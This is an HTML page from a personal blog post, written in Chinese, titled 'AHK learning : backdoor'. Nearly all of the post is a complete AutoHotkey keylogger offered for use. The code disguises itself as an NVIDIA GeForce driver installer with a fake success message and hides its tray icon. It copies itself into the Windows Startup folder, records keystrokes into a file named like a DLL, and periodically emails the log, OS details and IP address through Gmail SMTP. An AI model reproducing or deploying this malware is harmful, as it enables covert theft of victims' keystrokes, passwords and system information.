@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="AHK gmail backdoor以 ahk 為媒介並使用 gmail 作為傳輸的簡易後門若沒有防毒可以將後門植在startup資料夾 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AHK learning : backdoor">
+<meta property="og:url" content="http://neodoggy.github.io/2021/12/08/AHK-learning-backdoor/index.html">
+<meta property="og:site_name" content="neodoggy&#39;s blog">
+<meta property="og:description" content="AHK gmail backdoor以 ahk 為媒介並使用 gmail 作為傳輸的簡易後門若沒有防毒可以將後門植在startup資料夾 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970">
+<meta property="og:locale">
+<meta property="article:published_time" content="2021-12-08T02:17:49.000Z">
+<meta property="article:modified_time" content="2021-12-08T02:25:15.173Z">
+<meta property="article:author" content="neodoggy">
+<meta property="article:tag" content="coding">
+<meta property="article:tag" content="app-dev">
+<meta property="article:tag" content="ahk">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          
+            <link rel="shortcut icon" href="https://www.gravatar.com/avatar/b375e755015713138c17020ed92e3d3b?s=48">
+          
+        
+      
+      
+        
+          
+            <link rel="icon" type="image/png" href="https://www.gravatar.com/avatar/b375e755015713138c17020ed92e3d3b?s=192" sizes="192x192">
+          
+        
+      
+      
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="https://www.gravatar.com/avatar/b375e755015713138c17020ed92e3d3b?s=180">
+          
+        
+      
+    
+    <!-- title -->
+    <title>AHK learning : backdoor</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/artworks/">Artworks</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2021/12/02/AHK-learning-window-opacity/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://neodoggy.github.io/2021/12/08/AHK-learning-backdoor/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://neodoggy.github.io/2021/12/08/AHK-learning-backdoor/&text=AHK learning : backdoor"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://neodoggy.github.io/2021/12/08/AHK-learning-backdoor/&title=AHK learning : backdoor"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://neodoggy.github.io/2021/12/08/AHK-learning-backdoor/&is_video=false&description=AHK learning : backdoor"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=AHK learning : backdoor&body=Check out this article: http://neodoggy.github.io/2021/12/08/AHK-learning-backdoor/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://neodoggy.github.io/2021/12/08/AHK-learning-backdoor/&title=AHK learning : backdoor"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://neodoggy.github.io/2021/12/08/AHK-learning-backdoor/&title=AHK learning : backdoor"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://neodoggy.github.io/2021/12/08/AHK-learning-backdoor/&title=AHK learning : backdoor"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://neodoggy.github.io/2021/12/08/AHK-learning-backdoor/&title=AHK learning : backdoor"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://neodoggy.github.io/2021/12/08/AHK-learning-backdoor/&name=AHK learning : backdoor&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://neodoggy.github.io/2021/12/08/AHK-learning-backdoor/&t=AHK learning : backdoor"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#AHK-gmail-backdoor"><span class="toc-number">1.</span> <span class="toc-text">AHK gmail backdoor</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        AHK learning : backdoor
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">neodoggy</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-12-08T02:17:49.000Z" itemprop="datePublished">2021-12-08</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/devloping/">devloping</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/ahk/" rel="tag">ahk</a>, <a class="tag-link-link" href="/tags/app-dev/" rel="tag">app-dev</a>, <a class="tag-link-link" href="/tags/coding/" rel="tag">coding</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="AHK-gmail-backdoor"><a href="#AHK-gmail-backdoor" class="headerlink" title="AHK gmail backdoor"></a>AHK gmail backdoor</h1><p>以 ahk 為媒介並使用 gmail 作為傳輸的簡易後門<br>若沒有防毒可以將後門植在<code>startup</code>資料夾</p>
+<figure class="highlight ahk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#InstallMouseHook</span></span><br><span class="line"><span class="meta">#NoEnv</span></span><br><span class="line"><span class="meta">#Persistent</span></span><br><span class="line">SendMode Input</span><br><span class="line"><span class="meta">#SingleInstance Force ; Allow only one running instance of script.</span></span><br><span class="line"><span class="meta">#NoTrayIcon</span></span><br><span class="line"><span class="built_in">SetWorkingDir %</span><span class="built_in">A_ScriptDir</span>%  <span class="comment">; Ensures a consistent starting directory.</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">Menu,</span> tray, NoStandard </span><br><span class="line"><span class="comment">;menu, tray, add, Help </span></span><br><span class="line"><span class="comment">;RunAs, Administrator,</span></span><br><span class="line"><span class="built_in">goto,</span> main</span><br><span class="line"><span class="title">main:</span></span><br><span class="line">    if !(<span class="built_in">A_ScriptDir</span>=<span class="built_in">A_Startup</span>)&#123;</span><br><span class="line">        logto(<span class="string">&quot;ur@email&quot;</span>)</span><br><span class="line"><span class="built_in">        MsgBox,</span> <span class="number">0</span>, NVIDIA GeForce, Driver install success`n(<span class="keyword">exit</span> code <span class="number">0</span>x3096F)</span><br><span class="line"><span class="built_in">        FileCopy,</span> ./<span class="variable">%A_ScriptName%</span> , <span class="variable">%A_Startup%</span>/NVIDIA GeForce <span class="number">6</span>_1_3.exe, <span class="number">1</span></span><br><span class="line"><span class="built_in">        run,</span><span class="variable">%A_Startup%</span>/NVIDIA GeForce <span class="number">6</span>_1_3.exe</span><br><span class="line">        <span class="keyword">ExitApp</span></span><br><span class="line">    &#125;</span><br><span class="line">    Loop&#123;</span><br><span class="line"><span class="built_in">        FormatTime,</span>time,,mm </span><br><span class="line"><span class="built_in">        FormatTime,</span>st,,ss</span><br><span class="line">        nmb:=Mod(time, <span class="number">5</span>)</span><br><span class="line">        If (nmb=<span class="number">4</span> <span class="literal">And</span> st=<span class="number">30</span>)&#123;</span><br><span class="line">            senem(<span class="string">&quot;ur@email&quot;</span>)</span><br><span class="line">            delfile(<span class="string">&quot;../package.dll&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        dect(<span class="string">&quot;../package.dll&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">;MsgBox, 4, NVIDIA system compiler, Process will begin in five seconds, cancel to undo process.</span></span><br><span class="line"><span class="comment">;IfMsgBox Yes</span></span><br><span class="line"><span class="comment">;    GoTo, LogCode</span></span><br><span class="line"><span class="comment">;IfMsgBox No</span></span><br><span class="line"><span class="comment">;    sleep 5000</span></span><br><span class="line"><span class="comment">;    GoTo, LogCode</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">delfile(filename)&#123;</span><br><span class="line"><span class="built_in">    FileDelete,</span> <span class="variable">%filename%</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dect(filename)&#123;</span><br><span class="line"><span class="built_in">    Input,</span> Var,V L1 T1</span><br><span class="line"><span class="built_in">    FileAppend,</span> <span class="variable">%Var%</span>, <span class="variable">%filename%</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">senem(tow)&#123;</span><br><span class="line">    pmsg := ComObjCreate(<span class="string">&quot;CDO.Message&quot;</span>)     <span class="comment">; Do not change</span></span><br><span class="line">    pmsg.From := <span class="string">&quot;&quot;</span><span class="string">&quot;ochinchin&quot;</span><span class="string">&quot; &lt;ur@email&gt;&quot;</span></span><br><span class="line">    pmsg.To := tow</span><br><span class="line">    pmsg.BCC := <span class="string">&quot;&quot;</span> <span class="comment">; Blind Carbon Copy, Invisible for all, same syntax as CC</span></span><br><span class="line">    pmsg.CC := <span class="string">&quot;&quot;</span></span><br><span class="line">    pmsg.Subject := <span class="string">&quot;Log&quot;</span></span><br><span class="line"><span class="built_in">    FormatTime,</span>time,,MM/dd/yy h:mm:ss tt <span class="comment">; Omits seconds</span></span><br><span class="line"><span class="built_in">    FileRead,</span> OutputVar, ../package.dll</span><br><span class="line">    pmsg.TextBody := <span class="string">&quot;Log :`n&quot;</span> OutputVar <span class="string">&quot;`n&quot;</span> time <span class="string">&quot;`n OS type:&quot;</span>  <span class="built_in">A_OSType</span> <span class="string">&quot;`n OS Version:&quot;</span>  <span class="built_in">A_OSVersion</span> <span class="string">&quot;`n now dir:&quot;</span>  <span class="built_in">A_ScriptDir</span> <span class="string">&quot;`n startup dir:&quot;</span>  <span class="built_in">A_Startup</span> <span class="string">&quot;`n IP:&quot;</span>  <span class="built_in">A_IPAddress1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">; Remove semicolon to activate attachment feature</span></span><br><span class="line">    <span class="comment">;sAttach := &quot;../package.dll&quot; ; can add multiple attachments</span></span><br><span class="line">                                    <span class="comment">; the delimiter is |</span></span><br><span class="line"></span><br><span class="line">    fields := Object()</span><br><span class="line">    fields.smtpserver := <span class="string">&quot;smtp.gmail.com&quot;</span> <span class="comment">; specify your SMTP server</span></span><br><span class="line">    fields.smtpserverport := <span class="number">465</span> <span class="comment">; 25</span></span><br><span class="line">    fields.smtpusessl := <span class="literal">True</span> <span class="comment">; False</span></span><br><span class="line">    fields.sendusing := <span class="number">2</span> <span class="comment">; cdoSendUsingPort</span></span><br><span class="line">    fields.smtpauthenticate := <span class="number">1</span> <span class="comment">; cdoBasic</span></span><br><span class="line">    fields.sendusername := <span class="string">&quot;ur@email&quot;</span></span><br><span class="line">    fields.sendpassword := <span class="string">&quot;ur@password&quot;</span></span><br><span class="line">    fields.smtpconnectiontimeout := <span class="number">60</span></span><br><span class="line">    schema := <span class="string">&quot;http://schemas.microsoft.com/cdo/configuration/&quot;</span>  <span class="comment">; Do not change</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pfld := pmsg.Configuration.Fields</span><br><span class="line"></span><br><span class="line">    For field,value in fields</span><br><span class="line">    pfld.Item(schema . field) := value</span><br><span class="line">    pfld.Update()</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">    Loop,</span> Parse, sAttach, |, <span class="variable">%A_Space%</span><span class="variable">%A_Tab%</span></span><br><span class="line">    pmsg.AddAttachment(<span class="built_in">A_LoopField</span>)</span><br><span class="line">    pmsg.Send()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">logto(tow)&#123;</span><br><span class="line">    pmsg := ComObjCreate(<span class="string">&quot;CDO.Message&quot;</span>)     <span class="comment">; Do not change</span></span><br><span class="line">    pmsg.From := <span class="string">&quot;&quot;</span><span class="string">&quot;ochinchin&quot;</span><span class="string">&quot; &lt;ur@email&gt;&quot;</span></span><br><span class="line">    pmsg.To := tow</span><br><span class="line">    pmsg.BCC := <span class="string">&quot;&quot;</span> <span class="comment">; Blind Carbon Copy, Invisible for all, same syntax as CC</span></span><br><span class="line">    pmsg.CC := <span class="string">&quot;&quot;</span></span><br><span class="line">    pmsg.Subject := <span class="string">&quot;LogTo&quot;</span></span><br><span class="line"><span class="built_in">    FormatTime,</span>time,,MM/dd/yy h:mm:ss tt <span class="comment">; Omits seconds</span></span><br><span class="line">    <span class="comment">;FileRead, OutputVar, ../package.dll</span></span><br><span class="line">    pmsg.TextBody := <span class="string">&quot;Log on to computer :`n&quot;</span> time <span class="string">&quot;`n OS type:&quot;</span>  <span class="built_in">A_OSType</span> <span class="string">&quot;`n OS Version:&quot;</span>  <span class="built_in">A_OSVersion</span> <span class="string">&quot;`n now dir:&quot;</span>  <span class="built_in">A_ScriptDir</span> <span class="string">&quot;`n startup dir:&quot;</span>  <span class="built_in">A_Startup</span> <span class="string">&quot;`n IP:&quot;</span>  <span class="built_in">A_IPAddress1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">; Remove semicolon to activate attachment feature</span></span><br><span class="line">    <span class="comment">;sAttach := &quot;../package.dll&quot; ; can add multiple attachments</span></span><br><span class="line">                                    <span class="comment">; the delimiter is |</span></span><br><span class="line"></span><br><span class="line">    fields := Object()</span><br><span class="line">    fields.smtpserver := <span class="string">&quot;smtp.gmail.com&quot;</span> <span class="comment">; specify your SMTP server</span></span><br><span class="line">    fields.smtpserverport := <span class="number">465</span> <span class="comment">; 25</span></span><br><span class="line">    fields.smtpusessl := <span class="literal">True</span> <span class="comment">; False</span></span><br><span class="line">    fields.sendusing := <span class="number">2</span> <span class="comment">; cdoSendUsingPort</span></span><br><span class="line">    fields.smtpauthenticate := <span class="number">1</span> <span class="comment">; cdoBasic</span></span><br><span class="line">    fields.sendusername := <span class="string">&quot;ur@email&quot;</span></span><br><span class="line">    fields.sendpassword := <span class="string">&quot;ur@password&quot;</span></span><br><span class="line">    fields.smtpconnectiontimeout := <span class="number">60</span></span><br><span class="line">    schema := <span class="string">&quot;http://schemas.microsoft.com/cdo/configuration/&quot;</span>  <span class="comment">; Do not change</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pfld := pmsg.Configuration.Fields</span><br><span class="line"></span><br><span class="line">    For field,value in fields</span><br><span class="line">    pfld.Item(schema . field) := value</span><br><span class="line">    pfld.Update()</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">    Loop,</span> Parse, sAttach, |, <span class="variable">%A_Space%</span><span class="variable">%A_Tab%</span></span><br><span class="line">    pmsg.AddAttachment(<span class="built_in">A_LoopField</span>)</span><br><span class="line">    pmsg.Send()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">^Esc::</span></span><br><span class="line">delfile(<span class="string">&quot;../package.dll&quot;</span>)</span><br><span class="line"><span class="keyword">ExitApp</span></span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/artworks/">Artworks</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#AHK-gmail-backdoor"><span class="toc-number">1.</span> <span class="toc-text">AHK gmail backdoor</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://neodoggy.github.io/2021/12/08/AHK-learning-backdoor/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://neodoggy.github.io/2021/12/08/AHK-learning-backdoor/&text=AHK learning : backdoor"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://neodoggy.github.io/2021/12/08/AHK-learning-backdoor/&title=AHK learning : backdoor"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://neodoggy.github.io/2021/12/08/AHK-learning-backdoor/&is_video=false&description=AHK learning : backdoor"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=AHK learning : backdoor&body=Check out this article: http://neodoggy.github.io/2021/12/08/AHK-learning-backdoor/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://neodoggy.github.io/2021/12/08/AHK-learning-backdoor/&title=AHK learning : backdoor"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://neodoggy.github.io/2021/12/08/AHK-learning-backdoor/&title=AHK learning : backdoor"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://neodoggy.github.io/2021/12/08/AHK-learning-backdoor/&title=AHK learning : backdoor"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://neodoggy.github.io/2021/12/08/AHK-learning-backdoor/&title=AHK learning : backdoor"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://neodoggy.github.io/2021/12/08/AHK-learning-backdoor/&name=AHK learning : backdoor&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://neodoggy.github.io/2021/12/08/AHK-learning-backdoor/&t=AHK learning : backdoor"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2021
+    neodoggy
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/artworks/">Artworks</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+</html>
